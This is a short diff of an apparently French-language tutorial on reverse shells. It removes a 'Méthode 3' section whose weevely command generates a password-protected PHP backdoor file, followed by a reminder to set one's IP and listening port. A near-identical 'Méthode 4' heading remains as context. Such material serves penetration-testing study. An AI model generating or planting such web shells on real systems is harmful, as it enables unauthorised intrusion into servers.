@@ -39,15 +39,6 @@ NB: N'oubliez pas de faire les modifications qui vont bien, notamment votre IP e
 
 ---------------------------------------------
 
-#### Méthode 3: créer un reverse shell avec weevely
-  <pre><code data-trim class="yaml">
-      #reverse shell enregistré sur le bureau sous "backdoor.php" avec le mot de passe "noLog_hhhhhhhh"
-      weevely generate noLog_hhhhhhhh /root/Desktop/backdoor.php 
-  </code></pre> <br/>
-
-NB: N'oubliez pas de faire les modifications qui vont bien, notamment votre IP et port d'écoute.
-
----------------------------------------------
 
 #### Méthode 4: créer un reverse shell avec weevely
   <pre><code data-trim class="yaml">
